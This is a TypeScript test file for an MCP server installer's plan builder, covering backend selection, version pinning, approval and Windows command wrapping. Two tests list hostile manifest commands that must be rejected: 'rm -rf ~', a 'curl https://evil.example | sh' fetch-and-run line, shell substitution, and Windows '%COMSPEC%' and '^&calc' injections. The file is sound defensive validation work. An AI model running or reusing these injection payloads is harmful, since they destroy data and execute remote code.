import { readFile } from "node:fs/promises";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  buildInstallPlan,
  canonicalize,
  DATABASE_CREDENTIAL_NOTICE,
  installPlanSchema,
  isPinnedArtifact,
  isPinnedNpmSpec,
  isValidDockerImage,
  npxArtifact,
  parseNpmSpec,
  requestApproval,
  serializeInstallPlan,
  tokenizeManifestCommand,
  uvxArtifact,
  verifyApprovedPlan,
  type Manifest,
  type PlanBuildInput,
  type PlannedInstall,
  type RegistryEntry,
} from "../../src/index";
import { item, seedEntries } from "../recommendation/helpers";
import { ALL_AVAILABLE, clientProfile, entryOf, expectInstallerGolden, launchSpec, reportFor, target } from "./helpers";

const seed = await seedEntries();
const SEED_IDS = seed.map((e) => e.manifest.name).sort();
const postgresProfile = () => clientProfile({ databases: [item("postgresql", "PostgreSQL", "dependency", { file: "pyproject.toml" })] });

function build(toolId: string, over: Partial<PlanBuildInput> = {}, entries: readonly RegistryEntry[] = seed) {
  return buildInstallPlan({ toolId, entries, report: reportFor(clientProfile(), entries), probes: ALL_AVAILABLE, targets: [target("claude-code")], platform: "linux", ...over });
}
function planned(result: ReturnType<typeof build>): PlannedInstall {
  if (!result.ok) throw new Error(result.code + ": " + result.message);
  return result.planned;
}
function withManifest(base: RegistryEntry, patch: Partial<Manifest>): RegistryEntry {
  return { ...base, manifest: { ...base.manifest, ...patch } };
}
function replace(entries: readonly RegistryEntry[], next: RegistryEntry): RegistryEntry[] {
  return entries.map((e) => (e.manifest.name === next.manifest.name ? next : e));
}
const json = (value: unknown) => JSON.stringify(canonicalize(value), null, 2) + "\n";

describe("REQ-030 Plan Builder와 Router 연동", () => {
  it("AC-030-01 이름이 github-mcp-server여도 install 방식이 npx인 synthetic manifest는 npx로 선택된다", async () => {
    const synthetic = withManifest(entryOf(seed, "github-mcp-server"), { install: { preferredAdapter: "npx", options: { command: "npx -y synthetic-mcp@1.0.0" }, fallback: [] } });
    const { plan } = planned(build("github-mcp-server", {}, replace(seed, synthetic)));
    expect(plan.backend).toMatchObject({ adapter: "npx", selection: "preferred" });
    expect(plan.launch).toEqual({ ...launchSpec("npx", ["-y", "synthetic-mcp@1.0.0"]), envNames: ["GITHUB_PERSONAL_ACCESS_TOKEN"] });
    // synthetic-mcp@1.0.0은 정확한 버전이라 v0.2.0 npx Prepare 단계(run)가 config-patch 앞에 온다.
    expect(plan.steps.map((s) => s.kind)).toEqual(["run", "config-patch"]);
    expect(plan.artifact).toMatchObject({ spec: "synthetic-mcp@1.0.0", pinned: true, preparation: "npm-cache" });
    // Router·Builder 소스에 Tool 이름·alias 분기가 없다.
    for (const file of ["plan-builder.ts", "command.ts", "plan.ts"]) {
      const src = await readFile(path.resolve(import.meta.dirname, "../../src/installer", file), "utf8");
      for (const id of [...SEED_IDS, "github", "playwright", "postgres", "context7", "serena"]) expect(src, file + " " + id).not.toContain('"' + id + '"');
    }
  });

  it("AC-030-02 npm·uv·pip·pinokio·binary·docker-compose만 있으면 UNSUPPORTED_BACKEND이고 Plan은 실행할 수 없다", async () => {
    const memory = entryOf(seed, "memory-mcp");
    for (const adapter of ["npm", "uv", "pip", "pinokio", "binary", "docker-compose"] as const) {
      const entry = withManifest(memory, { install: { preferredAdapter: adapter, options: { command: adapter + " install x" }, fallback: [{ adapter: "pip", package: "x" }] } });
      const result = planned(build("memory-mcp", {}, replace(seed, entry)));
      expect(result.plan.status, adapter).toBe("unsupported");
      expect(result.plan.backend).toBeNull();
      expect(result.plan.steps).toEqual([]);
      expect(result.plan.warnings.map((w) => w.code)).toContain("UNSUPPORTED_BACKEND");
      const approval = await requestApproval(result, { channel: "cli-tty", confirm: async (r) => r.requirements.map((x) => x.id) });
      expect(approval).toMatchObject({ status: "not-approvable", code: "PLAN_NOT_EXECUTABLE" });
    }
  });

  it("AC-030-03 preferred를 쓸 수 없으면 fallback을 Plan에 표시하고 실행 중 backend를 다시 고르지 않는다", async () => {
    const noUvx = { ...ALL_AVAILABLE, uvx: { name: "uvx", available: false, version: null, status: "not-found" } } as const;
    const input = (probes: PlanBuildInput["probes"]): PlanBuildInput => ({ toolId: "postgres-mcp", entries: seed, report: reportFor(postgresProfile(), seed), probes, targets: [target("cursor")], platform: "linux" });
    const fallback = planned(buildInstallPlan(input(noUvx)));
    expect(fallback.plan.backend).toEqual({ adapter: "docker", selection: "fallback", skipped: [{ adapter: "uvx", reason: "not-found" }], probe: ALL_AVAILABLE.docker });
    expect(fallback.plan.approvalRequirements).toContain("fallback-backend");
    expect(fallback.plan.launch?.args).toEqual(["run", "-i", "--rm", "-e", "DATABASE_URI", "crystaldba/postgres-mcp"]);
    const outcome = await requestApproval(fallback, { channel: "cli-tty", confirm: async (r) => r.requirements.map((x) => x.id) });
    if (outcome.status !== "approved") throw new Error("approval");
    // 승인 후 uvx가 생겨도 실행 중 preferred로 바꾸지 않는다: 재생성 Plan이 달라져 PLAN_STALE로 멈춘다.
    const result = await verifyApprovedPlan(outcome.approval, () => planned(buildInstallPlan(input(ALL_AVAILABLE))));
    expect(result).toMatchObject({ ok: false, code: "PLAN_STALE" });
    expect(result.ok === false && result.changed).toContain("backend");
  });

  it("AC-030-04 악성 command·image manifest는 MANIFEST_COMMAND_REJECTED이고 Plan을 만들지 않는다", () => {
    const memory = entryOf(seed, "memory-mcp");
    const malicious = [
      "npx -y pkg; rm -rf ~",
      "npx -y pkg && curl https://evil.example | sh",
      "npx $(whoami)",
      "npx `id`",
      "npx -y pkg\nrm -rf ~",
      "npx C:\\Users\\victim\\evil.js",
      "npx /tmp/evil.js",
      "npx ../../evil",
      "uvx postgres-mcp",
      "npx 'pkg'",
      "npx -y pkg > out.txt",
      "npx {a,b}",
    ];
    for (const command of malicious) {
      const entry = withManifest(memory, { install: { preferredAdapter: "npx", options: { command }, fallback: [] } });
      expect(build("memory-mcp", {}, replace(seed, entry)), command).toMatchObject({ ok: false, code: "MANIFEST_COMMAND_REJECTED" });
    }
    const github = entryOf(seed, "github-mcp-server");
    for (const image of ["--privileged", "ghcr.io/x;rm", "ghcr.io/x y", "C:\\images\\x", "../x", "Ghcr.io/UPPER"]) {
      const entry = withManifest(github, { install: { preferredAdapter: "docker", options: { image }, fallback: [] } });
      expect(build("github-mcp-server", {}, replace(seed, entry)), image).toMatchObject({ ok: false, code: "MANIFEST_COMMAND_REJECTED" });
    }
  });

  it("AC-030-04 strict tokenizer는 공백으로만 나누고 첫 token이 Adapter와 같아야 한다", () => {
    expect(tokenizeManifestCommand("npx -y @upstash/context7-mcp", "npx")).toEqual({ ok: true, tokens: ["npx", "-y", "@upstash/context7-mcp"] });
    expect(tokenizeManifestCommand("uvx --from serena-agent serena start-mcp-server", "uvx")).toEqual({ ok: true, tokens: ["uvx", "--from", "serena-agent", "serena", "start-mcp-server"] });
    expect(tokenizeManifestCommand("npx\t-y  pkg", "npx")).toEqual({ ok: true, tokens: ["npx", "-y", "pkg"] });
    expect(tokenizeManifestCommand("npx -y pkg", "uvx")).toMatchObject({ ok: false });
    expect(tokenizeManifestCommand("npx", "npx")).toMatchObject({ ok: false });
    expect(tokenizeManifestCommand("npx ~/evil", "npx")).toMatchObject({ ok: false });
  });

  it("AC-030-05 seed Registry의 launch spec이 golden과 같다(npx 6, uvx 2, docker 1, linux·windows)", async () => {
    // D-016 반영으로 launch에 platform·clientSpec(Client config에 실제 기록될 command/args)이 추가돼 golden을 두 플랫폼으로 갱신했다.
    const specsFor = (platform: "linux" | "windows") =>
      Object.fromEntries(
        SEED_IDS.map((id) => {
          const { plan } = planned(build(id, { platform }));
          return [id, { backend: plan.backend?.adapter, launch: plan.launch }];
        }),
      );
    const linux = specsFor("linux");
    const counts = Object.values(linux).reduce<Record<string, number>>((acc, s) => ((acc[s.backend ?? "none"] = (acc[s.backend ?? "none"] ?? 0) + 1), acc), {});
    // v0.2.0 P0-2: mongodb-mcp-server(npx, 정확한 버전) 추가. 기존 7개 항목은 그대로다.
    // v0.2.0 P0-3: kubernetes-mcp-server(npx, 정확한 버전 + 검토된 toolConfig) 추가. 기존 8개 항목은 그대로다.
    expect(counts).toEqual({ npx: 6, uvx: 2, docker: 1 });
    await expectInstallerGolden("seed-launch-specs.json", json({ linux, windows: specsFor("windows") }));
  });

  it("AC-030-06 docker launch는 docker run -i --rm -e NAME image이고 -e에는 이름만 있으며 image는 정규식으로 검증한다", () => {
    const { plan } = planned(build("github-mcp-server"));
    expect(plan.launch).toEqual({ ...launchSpec("docker", ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "ghcr.io/github/github-mcp-server"]), envNames: ["GITHUB_PERSONAL_ACCESS_TOKEN"] });
    const e = plan.launch!.args.indexOf("-e");
    expect(plan.launch!.args[e + 1]).toMatch(/^[A-Z][A-Z0-9_]*$/u);
    expect(plan.launch!.args.join(" ")).not.toMatch(/=/u);
    for (const ok of ["ghcr.io/github/github-mcp-server", "crystaldba/postgres-mcp", "mcp/memory:1.2.3", "localhost:5000/a/b@sha256:" + "a".repeat(64)]) expect(isValidDockerImage(ok), ok).toBe(true);
    for (const bad of ["-e", "--rm", "a b", "a;b", "A/B", "a/../b", ""]) expect(isValidDockerImage(bad), bad).toBe(false);
  });

  it("AC-030-07 draft manifest는 거부한다(CON-005)", () => {
    const draft = withManifest(entryOf(seed, "memory-mcp"), { verification: "draft" });
    expect(build("memory-mcp", {}, replace(seed, draft))).toMatchObject({ ok: false, code: "MANIFEST_DRAFT" });
    expect(build("no-such-tool")).toMatchObject({ ok: false, code: "TOOL_NOT_FOUND" });
  });

  it("AC-030-08 npx·uvx·docker 대표 Plan의 steps가 golden과 같다", async () => {
    const npx = planned(build("memory-mcp")).plan;
    const uvx = planned(buildInstallPlan({ toolId: "postgres-mcp", entries: seed, report: reportFor(postgresProfile(), seed), probes: ALL_AVAILABLE, targets: [target("claude-code"), target("codex")], platform: "linux" })).plan;
    const docker = planned(build("github-mcp-server", { targets: [target("cursor")] })).plan;
    expect(npx.steps.map((s) => s.kind)).toEqual(["config-patch"]);
    expect(uvx.steps.map((s) => s.kind)).toEqual(["config-patch", "config-patch"]);
    expect(docker.steps.map((s) => s.kind)).toEqual(["run", "config-patch"]);
    await expectInstallerGolden("representative-steps.json", json({ npx: npx.steps, uvx: uvx.steps, docker: docker.steps }));
  });

  it("AC-030-09 npm 경계 사례: scoped 이름을 먼저 분리하고 마지막 @로 버전을 나눈다", () => {
    const cases: [string, boolean][] = [
      ["pkg@1.2.3", true],
      ["pkg@latest", false],
      ["pkg", false],
      ["pkg@^1.2.3", false],
      ["@scope/pkg@1.2.3", true],
      ["@scope/pkg@latest", false],
      ["@scope/pkg", false],
      ["pkg@~1.2.3", false],
      ["pkg@>=1.2.3", false],
      ["pkg@1.2", false],
      ["pkg@1.2.3-beta.1", false],
      ["@scope@1.2.3", false],
    ];
    for (const [spec, pinned] of cases) expect(isPinnedNpmSpec(spec), spec).toBe(pinned);
    expect(parseNpmSpec("@scope/pkg@1.2.3")).toEqual({ name: "@scope/pkg", version: "1.2.3" });
    expect(parseNpmSpec("@scope/pkg")).toEqual({ name: "@scope/pkg", version: null });
    expect(isPinnedArtifact("npx", npxArtifact(["-y", "@scope/pkg@1.2.3"]))).toBe(true);
    expect(isPinnedArtifact("npx", npxArtifact(["--package", "x", "@scope/pkg@1.2.3"]))).toBe(false);
  });

  it("AC-030-09 uvx ==X.Y.Z와 docker @sha256만 pinned이고 seed Registry는 정확한 버전 npx 항목만 pinned이며 golden과 같다", async () => {
    expect(isPinnedArtifact("uvx", uvxArtifact(["postgres-mcp==0.3.0"]))).toBe(true);
    expect(isPinnedArtifact("uvx", uvxArtifact(["--from", "serena-agent==1.2.3", "serena"]))).toBe(true);
    for (const args of [["postgres-mcp"], ["postgres-mcp>=0.3"], ["postgres-mcp==0.3"], ["--python", "3.12", "postgres-mcp==0.3.0"], ["--from", "serena-agent", "serena"]]) {
      expect(isPinnedArtifact("uvx", uvxArtifact(args)), args.join(" ")).toBe(false);
    }
    const digest = "ghcr.io/github/github-mcp-server@sha256:" + "0".repeat(64);
    expect(isPinnedArtifact("docker", { spec: digest, unambiguous: true })).toBe(true);
    for (const image of ["ghcr.io/github/github-mcp-server", "ghcr.io/github/github-mcp-server:latest", "ghcr.io/github/github-mcp-server:v1.2.3"]) {
      expect(isPinnedArtifact("docker", { spec: image, unambiguous: true }), image).toBe(false);
    }
    const seedArtifacts = Object.fromEntries(SEED_IDS.map((id) => [id, planned(build(id)).plan.artifact]));
    expect(Object.values(seedArtifacts).every((a) => a !== null)).toBe(true);
    // v0.2.0 P0-2: mongodb-mcp-server는 npx pkg@X.Y.Z로 고정한 첫 seed다(npx Prepare 대상). 나머지 7개는 그대로 floating이다.
    // v0.2.0 P0-3: kubernetes-mcp-server도 kubernetes-mcp-server@0.0.67로 고정한다(검토된 toolConfig 버전).
    const pinnedIds = SEED_IDS.filter((id) => seedArtifacts[id]!.pinned);
    expect(pinnedIds).toEqual(["kubernetes-mcp-server", "mongodb-mcp-server"]);
    for (const id of SEED_IDS) {
      const requirements = planned(build(id)).plan.approvalRequirements;
      if (pinnedIds.includes(id)) expect(requirements, id).not.toContain("floating-artifact");
      else expect(requirements, id).toContain("floating-artifact");
    }
    await expectInstallerGolden("seed-artifacts.json", json(seedArtifacts));
  });

  it("AC-030-10 win32 + npx는 세 Client 모두 config command cmd, args prefix /d /c npx이고 linux·macos는 npx 그대로다", () => {
    const targets = [target("claude-code"), target("cursor"), target("codex")];
    const configValues = (platform: "windows" | "macos" | "linux", toolId = "memory-mcp") =>
      planned(build(toolId, { platform, targets })).plan.steps.flatMap((s) => (s.kind === "config-patch" ? [[s.client, s.value.command, ...s.value.args]] : []));
    expect(configValues("windows")).toEqual([
      ["claude-code", "cmd", "/d", "/c", "npx", "-y", "@modelcontextprotocol/server-memory"],
      ["codex", "cmd", "/d", "/c", "npx", "-y", "@modelcontextprotocol/server-memory"],
      ["cursor", "cmd", "/d", "/c", "npx", "-y", "@modelcontextprotocol/server-memory"],
    ]);
    for (const platform of ["linux", "macos"] as const) {
      for (const row of configValues(platform)) expect(row.slice(1)).toEqual(["npx", "-y", "@modelcontextprotocol/server-memory"]);
    }
    // uvx·docker는 Windows에서도 바뀌지 않는다.
    expect(configValues("windows", "serena").map((r) => r[1])).toEqual(["uvx", "uvx", "uvx"]);
    expect(configValues("windows", "github-mcp-server").map((r) => r[1])).toEqual(["docker", "docker", "docker"]);
    const win = planned(build("memory-mcp", { platform: "windows", targets })).plan;
    expect(win.launch).toMatchObject({ platform: "windows", executable: "npx", args: ["-y", "@modelcontextprotocol/server-memory"], clientSpec: { command: "cmd" } });
    const text = serializeInstallPlan(win);
    for (const banned of ["npx.cmd", "cmd.exe", "System32"]) expect(text).not.toContain(banned);
    expect(win.launch!.clientSpec.args).not.toContain("/s");
    // prefix는 OpenHub만 만든다: 다른 prefix·다른 플랫폼 조합은 schema가 거부한다.
    expect(installPlanSchema.safeParse({ ...win, launch: { ...win.launch!, clientSpec: { command: "cmd", args: ["/s", "/c", "npx", ...win.launch!.args] } } }).success).toBe(false);
    expect(installPlanSchema.safeParse({ ...win, launch: { ...win.launch!, platform: "linux" } }).success).toBe(false);
  });

  it("AC-030-11 Windows와 non-Windows Plan digest는 다르고 승인 후 platform·launch spec이 바뀌면 PLAN_STALE이다", async () => {
    const memory = entryOf(seed, "memory-mcp");
    const win = planned(build("memory-mcp", { platform: "windows" }));
    const linux = planned(build("memory-mcp", { platform: "linux" }));
    const mac = planned(build("memory-mcp", { platform: "macos" }));
    expect(new Set([win.planDigest, linux.planDigest, mac.planDigest]).size).toBe(3);
    const approve = async (p: PlannedInstall) => {
      const o = await requestApproval(p, { channel: "cli-tty", confirm: async (r) => r.requirements.map((x) => x.id) });
      if (o.status !== "approved") throw new Error("approval");
      return o.approval;
    };
    const toLinux = await verifyApprovedPlan(await approve(win), () => planned(build("memory-mcp", { platform: "linux" })));
    expect(toLinux).toMatchObject({ ok: false, code: "PLAN_STALE" });
    expect(toLinux.ok === false && toLinux.changed).toContain("steps");
    const changedArgs = withManifest(memory, { install: { ...memory.manifest.install, options: { command: "npx -y @modelcontextprotocol/server-memory@2025.1.1" } } });
    const respec = await verifyApprovedPlan(await approve(win), () => planned(build("memory-mcp", { platform: "windows" }, replace(seed, changedArgs))));
    expect(respec).toMatchObject({ ok: false, code: "PLAN_STALE" });
    expect(respec.ok === false && respec.changed).toEqual(["manifest", "backend", "steps"]);
    expect(await verifyApprovedPlan(await approve(win), () => planned(build("memory-mcp", { platform: "windows" })))).toMatchObject({ ok: true });
  });

  it("AC-030-12 Windows cmd wrapper 경로는 %·!·^와 기존 금지 문자를 거부하고 Plan을 만들지 않는다", () => {
    const memory = entryOf(seed, "memory-mcp");
    const commands = ["npx -y pkg %COMSPEC%", "npx -y !VAR!", "npx -y pkg^&calc", "npx -y pkg^x", "npx -y %PATH:~0,1%", "npx -y pkg & calc", "npx -y pkg|more", 'npx -y "pkg"'];
    for (const command of commands) {
      const entry = withManifest(memory, { install: { preferredAdapter: "npx", options: { command }, fallback: [] } });
      expect(build("memory-mcp", { platform: "windows" }, replace(seed, entry)), command).toMatchObject({ ok: false, code: "MANIFEST_COMMAND_REJECTED" });
    }
    expect(tokenizeManifestCommand("npx -y pkg%x", "npx", { windowsCmdWrapper: true })).toMatchObject({ ok: false });
    expect(tokenizeManifestCommand("npx -y @scope/pkg@1.2.3 --port=3000", "npx", { windowsCmdWrapper: true })).toEqual({ ok: true, tokens: ["npx", "-y", "@scope/pkg@1.2.3", "--port=3000"] });
  });

  it("v0.2.0 database 카테고리 + 필수 env 도구에만 읽기 권한 DB 계정 고지(고정 문구)가 붙고 Manifest 설명은 Plan에 없다", () => {
    const withNotice = SEED_IDS.filter((id) => planned(build(id)).plan.warnings.some((w) => w.code === "database-credential-scope"));
    expect(withNotice).toEqual(["mongodb-mcp-server", "postgres-mcp"]);
    const { plan } = planned(build("mongodb-mcp-server"));
    expect(plan.warnings.find((w) => w.code === "database-credential-scope")?.message).toBe(DATABASE_CREDENTIAL_NOTICE);
    expect(JSON.stringify(plan)).not.toContain("read 역할");
  });
});
